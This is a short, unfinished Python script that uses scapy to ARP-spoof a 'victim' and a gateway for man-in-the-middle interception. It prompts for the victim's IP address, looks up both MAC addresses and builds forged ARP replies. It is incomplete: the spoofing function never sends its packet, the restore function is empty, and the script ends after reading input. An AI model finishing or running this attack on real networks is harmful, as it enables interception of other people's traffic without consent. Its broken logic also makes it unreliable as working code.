from scapy.all import *
import os
import sys

def sp(vfrom, vto, vtohw):
    arps = ARP()
    arps.psrc = vfrom
    arps.pdst = vto
    arps.hwdst = vtohw
    arps.op = 2
    
def spoof(victim, gateway):
    arps1 = ARP(pdst=victim)
    arps2 = ARP(pdst=gateway)
    r1 = sr1(arps1, verbose=False, timeout=3)
    r2 = sr1(arps2, verbose=False, timeout=3)
    if r1 != None and r2 != None:
        hw1 = r1.hwsrc
        hw2 = r2.hwsrc
        sp(gateway, victim, hw1)
        sp(victim, gateway, hw2)
    
def restore(victim, gateway):
    print()
    
v = str(input('ENTER VICTIM IP ADDRESS : '))
g = str(input('ENTER GATEWAY : '))